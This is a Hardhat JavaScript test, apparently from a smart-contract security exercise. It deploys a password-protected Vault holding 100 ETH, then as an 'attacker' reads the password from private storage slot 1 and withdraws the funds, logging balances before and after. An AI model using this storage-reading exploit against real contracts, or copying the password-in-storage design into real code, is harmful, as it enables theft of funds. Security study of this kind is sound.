
const { expect } = require("chai");
const {ethers} = require("hardhat");

describe("Access control", function () {
  let attacker, deployer , agreedPrice
 beforeEach( async () =>{
 
    [deployer,attacker,user] = await ethers.getSigners();
  const Vault = await ethers.getContractFactory("Vault",deployer);
   this.vault= await Vault.deploy(ethers.utils.formatBytes32String("myPassword"));
   await this.vault.deposite({value : ethers.utils.parseEther('100')})
})
 
describe('Agreed Price', () => { 
  it("should set price at deplotment ",async () => {
    let intialAttackerBalance = await ethers.provider.getBalance(attacker.address)
    console.log("Intial Attacker Balance",ethers.utils.formatEther(intialAttackerBalance))
    let intialValutBalance = await ethers.provider.getBalance(this.vault.address)
    console.log("Intial Vault Balance",ethers.utils.formatEther(intialValutBalance))
    const pwd = await ethers.provider.getStorageAt(this.vault.address,1)
    await this.vault.connect(attacker).withdraw(pwd)
    let finalAttackerBalance = await ethers.provider.getBalance(attacker.address)
    console.log("Final Attacker Balance",ethers.utils.formatEther(finalAttackerBalance))
    let finalValutBalance = await ethers.provider.getBalance(this.vault.address)
    console.log("Final Vault Balance",ethers.utils.formatEther(finalValutBalance))
  })
  
})

   
  })

 


